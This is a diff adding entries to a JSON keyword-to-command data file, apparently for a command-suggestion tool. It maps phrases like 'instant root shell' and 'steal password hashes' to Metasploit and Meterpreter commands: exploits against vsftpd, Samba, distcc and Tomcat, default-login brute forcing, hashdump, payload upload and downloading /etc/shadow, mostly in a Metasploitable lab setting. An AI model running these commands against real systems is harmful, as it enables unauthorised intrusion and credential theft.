@@ -3869,5 +3869,536 @@
       "unpack rar",
       "open rar package"
     ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "msfconsole",
+    "desc": "launches the metasploit framework terminal interface",
+    "keywords": [
+      "start metasploit",
+      "open msf",
+      "start hacking tool",
+      "exploit framework"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "search vsftpd",
+    "desc": "searches the entire exploit database for a specific software name or vulnerability keyword",
+    "keywords": [
+      "find exploit",
+      "search vulnerability",
+      "search module",
+      "lookup exploit"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "search type:exploit platform:linux samba",
+    "desc": "performs a filtered search for linux exploits specifically targeting samba service",
+    "keywords": [
+      "advanced search",
+      "filter exploit",
+      "linux search",
+      "specific service search"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
+    "desc": "selects and activates a specific exploit or auxiliary module to use against the target",
+    "keywords": [
+      "select module",
+      "choose exploit",
+      "load exploit",
+      "load module"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "info",
+    "desc": "displays deep details, description, vulnerabilities references, and required targets for the loaded module",
+    "keywords": [
+      "module details",
+      "exploit info",
+      "check cve",
+      "read exploit notes"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "show options",
+    "desc": "lists all required and optional configurations (like target ip, ports) needed before attacking",
+    "keywords": [
+      "check settings",
+      "view arguments",
+      "list variables",
+      "show parameters"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "show payloads",
+    "desc": "lists all compatible payloads or shells (like reverse shell, bind shell) that work with the loaded exploit",
+    "keywords": [
+      "view target shells",
+      "list payloads",
+      "compatible shells",
+      "payload options"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "set RHOSTS",
+    "desc": "sets the target machine remote host ip address for scanning or attacking",
+    "keywords": [
+      "set target ip",
+      "target configuration",
+      "remote host",
+      "victim ip"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "set RPORT 21",
+    "desc": "changes the target service destination port if it is running on a custom port",
+    "keywords": [
+      "change port",
+      "target port setup",
+      "remote port",
+      "port modification"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "set LHOST <your_ip>",
+    "desc": "sets your local attacking machine ip address where the target will send back the connection",
+    "keywords": [
+      "reverse shell ip",
+      "attacker ip",
+      "local host",
+      "listening ip"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "set LPORT 4444",
+    "desc": "sets the listening port on the attacker machine to wait for incoming connections",
+    "keywords": [
+      "listening port",
+      "reverse shell port",
+      "local port",
+      "connect back port"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "set PAYLOAD cmd/unix/interact",
+    "desc": "explicitly selects the specific type of shell connection you want after a successful exploit",
+    "keywords": [
+      "select payload",
+      "change shell type",
+      "set connection mechanism"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "exploit",
+    "desc": "fires up and launches the attack against the configured target machine",
+    "keywords": [
+      "launch attack",
+      "fire exploit",
+      "run exploit",
+      "execute attack"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "run",
+    "desc": "executes an auxiliary scanner or background module instead of a destructive exploit",
+    "keywords": [
+      "execute scanner",
+      "run auxiliary",
+      "start scanning",
+      "test host"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "sessions -l",
+    "desc": "lists all currently open active background sessions and compromised shells",
+    "keywords": [
+      "active shells",
+      "check connections",
+      "background list",
+      "view sessions"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "sessions -i <session_id>",
+    "desc": "interacts directly with a specific active background session to run commands on the target",
+    "keywords": [
+      "enter shell",
+      "open session",
+      "catch connection",
+      "go to target terminal"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "background",
+    "desc": "sends the active meterpreter or shell session to the background safely without closing it",
+    "keywords": [
+      "hide session",
+      "exit shell safely",
+      "background shell",
+      "keep session alive"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "jobs -l",
+    "desc": "views all ongoing background activities or listener tasks currently running inside metasploit",
+    "keywords": [
+      "list active tasks",
+      "running listeners",
+      "background jobs",
+      "check jobs"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "kill <job_id>",
+    "desc": "stops and terminates a specific ongoing background listener or scanning job",
+    "keywords": [
+      "stop job",
+      "kill listener",
+      "close task",
+      "stop exploit background"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/ftp/ftp_version; set RHOSTS ; run",
+    "desc": "scans and detects the exact version banner of the ftp service running on the target",
+    "keywords": [
+      "scan ftp version",
+      "check ftp brand",
+      "metasploitable ftp recon",
+      "port 21 scan"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/ftp/anonymous; set RHOSTS ; run",
+    "desc": "tests if the ftp server allows anonymous user logins without a password",
+    "keywords": [
+      "check ftp anonymous",
+      "guest ftp access",
+      "insecure ftp test",
+      "zero login ftp"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/ssh/ssh_version; set RHOSTS ; run",
+    "desc": "connects to port 22 to fingerprint the precise version of the running secure shell service",
+    "keywords": [
+      "ssh version discovery",
+      "identify ssh banner",
+      "port 22 scanner",
+      "open ssh check"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/telnet/telnet_version; set RHOSTS ; run",
+    "desc": "fingerprints the telnet management daemon version banner on port 23",
+    "keywords": [
+      "telnet version scan",
+      "port 23 recon",
+      "unencrypted login banner",
+      "identify telnet"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/smb/smb_version; set RHOSTS ; run",
+    "desc": "scans the target to determine the operating system version and exact samba file sharing version",
+    "keywords": [
+      "find samba version",
+      "operating system fingerprint",
+      "smb version scan",
+      "port 139 445 recon"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/http/http_version; set RHOSTS ; run",
+    "desc": "crawls the web server on port 80 to discover the web engine banner (like apache or tomcat)",
+    "keywords": [
+      "web server version",
+      "port 80 scanner",
+      "apache version scan",
+      "find http software"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS ; run",
+    "desc": "brute forces default administrative login passwords for the apache tomcat manager portal",
+    "keywords": [
+      "tomcat default password",
+      "crack tomcat manager",
+      "apache tomcat scan",
+      "web login attack"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/smtp/smtp_version; set RHOSTS ; run",
+    "desc": "identifies the specific mail server daemon version operating on port 25",
+    "keywords": [
+      "mail server scan",
+      "smtp banner grab",
+      "port 25 discovery",
+      "find mail software"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/smtp/smtp_enum; set RHOSTS ; run",
+    "desc": "enumerates valid username list from the email server using vrfy and expn triggers",
+    "keywords": [
+      "find email users",
+      "list system users via smtp",
+      "user enumeration port 25"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/mysql/mysql_version; set RHOSTS ; run",
+    "desc": "fingerprints the database layer engine banner on port 3306",
+    "keywords": [
+      "mysql version discovery",
+      "database scan",
+      "port 3306 engine check"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/mysql/mysql_login; set RHOSTS ; run",
+    "desc": "tests for empty root passwords or common default accounts on the mysql database engine",
+    "keywords": [
+      "default mysql password",
+      "bypass database login",
+      "blank root sql check"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/vnc/vnc_login; set RHOSTS ; run",
+    "desc": "checks if the graphical remote vnc desktop service uses default passwords like password or password123",
+    "keywords": [
+      "crack vnc password",
+      "remote screen sharing check",
+      "port 5900 audit"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/snmp/snmp_login; set RHOSTS ; run",
+    "desc": "sweeps the machine for active network management strings to steal routing data",
+    "keywords": [
+      "snmp string lookup",
+      "public community string check",
+      "network configuration leak"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS ; exploit",
+    "desc": "attacks a backdoored vsftpd version on metasploitable to immediately trigger a root command shell",
+    "keywords": [
+      "vsftpd backdoor exploit",
+      "instant root shell",
+      "port 21 attack",
+      "crack vsftpd 2.3.4"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/multi/samba/usermap_script; set RHOSTS ; exploit",
+    "desc": "fires an absolute high-success execution vulnerability against default samba network configurations for instant root shell",
+    "keywords": [
+      "samba usermap attack",
+      "instant root access linux",
+      "network file share exploit",
+      "port 139 hack"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/linux/samba/trans2open; set RHOSTS ; exploit",
+    "desc": "targets a heap overflow condition in older samba versions on linux systems to return system control",
+    "keywords": [
+      "samba heap overflow",
+      "second samba exploit",
+      "alternative smb hack"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/multi/misc/java_rmi_server; set RHOSTS ; exploit",
+    "desc": "takes advantage of insecure default configuration options in java remote method invocation endpoints",
+    "keywords": [
+      "java rmi exploitation",
+      "port 1099 attack",
+      "application layer root shell"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS ; exploit",
+    "desc": "capitalizes on a hidden backdoor embedded in old malicious downloads of the unrealircd chat server software",
+    "keywords": [
+      "unreal ircd backdoor exploit",
+      "port 6667 shell",
+      "network chat daemon attack"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/multi/http/php_cgi_arg_injection; set RHOSTS ; exploit",
+    "desc": "injects operating system query parameters directly via raw web requests due to php execution mistakes",
+    "keywords": [
+      "php cgi argument injection",
+      "web server remote command execution",
+      "web application exploit",
+      "port 80 rce"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/multi/http/tomcat_mgr_deploy; set RHOSTS ; set HttpPassword ; set HttpUsername ; exploit",
+    "desc": "uses hijacked web portal admin configurations to upload and run malicious java war packages",
+    "keywords": [
+      "tomcat manager deploy application",
+      "exploit web admin panel",
+      "war reverse shell package"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/unix/misc/distcc_exec; set RHOSTS ; exploit",
+    "desc": "abuses compilation acceleration features that do not authenticate client connections properly",
+    "keywords": [
+      "distcc compilation exploit",
+      "network daemon remote command tool",
+      "compiler attack"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/unix/webapp/twiki_history; set RHOSTS ; exploit",
+    "desc": "triggers code injection issues inside internal revision records sections of standard wiki tools",
+    "keywords": [
+      "twiki vulnerability exploit",
+      "hidden web component attack",
+      "portal injection wiki"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "sysinfo",
+    "desc": "reads the target system name, processor type, architecture, and core kernel version",
+    "keywords": [
+      "target operating system info",
+      "check system architecture",
+      "machine details meterpreter"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "getuid",
+    "desc": "checks exactly what user account or permission privilege level your session currently holds on the system",
+    "keywords": [
+      "whoami meterpreter",
+      "check root status",
+      "current permission level"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "hashdump",
+    "desc": "pulls and decrypts all user account names along with their encrypted password strings out of system databases",
+    "keywords": [
+      "dump linux shadow file",
+      "steal password hashes",
+      "retrieve sam hashes",
+      "extract passwords"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "shell",
+    "desc": "drops you out of the complex meterpreter interface down into a standard native system bash terminal",
+    "keywords": [
+      "spawn terminal shell",
+      "native command line interface",
+      "interactive terminal command"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "upload /path/to/local/file /tmp/file",
+    "desc": "transfers a script, privilege escalation exploit, or toolkit binary from your system onto the target machine",
+    "keywords": [
+      "send exploit file",
+      "push malware",
+      "copy payload to victim"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "download /etc/shadow /path/to/save",
+    "desc": "steals sensitive databases or flat configuration records down from the victim machine directly to your workspace",
+    "keywords": [
+      "steal shadow file",
+      "copy configuration file",
+      "save database file local"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "ps",
+    "desc": "provides a complete map of all application processes currently executing live in memory on the victim machine",
+    "keywords": [
+      "view running processes",
+      "task manager terminal",
+      "process map target"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "getpid",
+    "desc": "identifies the specific current process identifier number that your malicious shell is sitting inside",
+    "keywords": [
+      "current process identifier",
+      "target memory slot",
+      "active task location"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use post/linux/gather/local_exploit_suggester; set SESSION ; run",
+    "desc": "scans your active standard access shell session against missing patch logs to recommend easy privilege escalation exploits",
+    "keywords": [
+      "search local exploits",
+      "privilege escalation checker",
+      "look for local vulnerabilities",
+      "path to root suggest"
+    ]
   }
 ]
